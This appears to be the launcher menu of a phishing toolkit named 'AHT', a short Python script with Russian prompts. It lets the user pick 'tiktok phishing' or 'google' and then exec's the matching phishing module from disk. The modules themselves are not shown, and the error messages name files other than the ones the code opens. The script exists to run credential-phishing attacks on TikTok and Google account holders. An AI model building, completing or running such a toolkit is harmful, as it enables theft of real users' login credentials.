import os

print('1 - tiktok phishing')
print ('2 - google')

phish = input('Добро пожаловать на AHT. Выберите одну цифру выше: ')

if phish == '1':
    try:
        with open('Phishing/Tiktok.py', 'r') as file:
            os.system('clear')
            exec(file.read())
    except FileNotFoundError:
        print("Файл 'Phishing.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")
if phish =='2':
    try:
        with open('/Google.py', 'r')as google:
            os.system('clear')
            exec(google.read())
    except FileNotFoundError:
        print("Файл 'GooglePhishing.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")
